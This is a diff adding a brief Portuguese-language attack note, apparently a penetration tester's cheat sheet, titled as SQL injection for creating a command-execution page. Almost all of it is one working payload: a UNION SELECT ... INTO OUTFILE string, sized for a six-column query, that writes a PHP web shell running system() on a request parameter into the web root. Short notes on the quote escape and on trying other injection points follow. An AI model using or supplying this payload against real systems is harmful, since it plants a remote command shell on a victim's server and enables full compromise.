@@ -1,0 +1,10 @@
+--------------------------------------------------------
+SQLINJECTION PARA CRIAR PAGINA PARA EXECUCAO DE COMANDOS
+--------------------------------------------------------
+
+" union select "<?php if (isset($_REQUEST['cmd'])){echo '<pre>'; system($_REQUEST['cmd']); echo '</pre>';} ?><form action=<?php echo basename($_SERVER['PHP_SELF'])?>> <input type=text name=cmd size=20> <input type=submit></form>", "","","","","" into outfile "/var/www/html/filename.php" #
+
+comando executado para um injection de 6 campos
+
+- o escape no exemplo foi feito com "
+- verificar o funcionamento em outros sqli
